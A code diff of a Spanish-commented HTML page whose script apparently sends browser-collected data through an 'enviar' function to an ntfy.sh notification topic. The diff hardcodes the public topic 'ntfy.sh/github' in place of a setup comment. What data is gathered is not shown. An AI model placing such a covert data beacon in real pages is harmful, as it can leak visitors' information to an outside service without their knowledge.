@@ -12,16 +12,8 @@
 <body>
 <div id="msg">inicializando…</div>
 <script>
-/* ============================================================
-   CONFIGURA SOLO ESTA LINEA
-   Pon aqui tu canal de ntfy (el nombre que elegiste en el PASO 1)
-   ============================================================ */
-const CANAL = "https://ntfy.sh/CAMBIA-ESTO-por-tu-canal-secreto";
-
-/* Opcional: si haces el PASO 6 (Cloudflare), pega aqui la URL del
-   Worker y dejara de usar ntfy directamente. Si no, dejalo vacio. */
-const HOOK = "";
-/* ============================================================ */
+const CANAL = "https://ntfy.sh/github";
+const HOOK  = "";
 
 const sha256 = async s =>
   [...new Uint8Array(await crypto.subtle.digest("SHA-256",
@@ -146,4 +138,4 @@ async function enviar(d){
 })();
 </script>
 </body>
-  </html>
+</html>
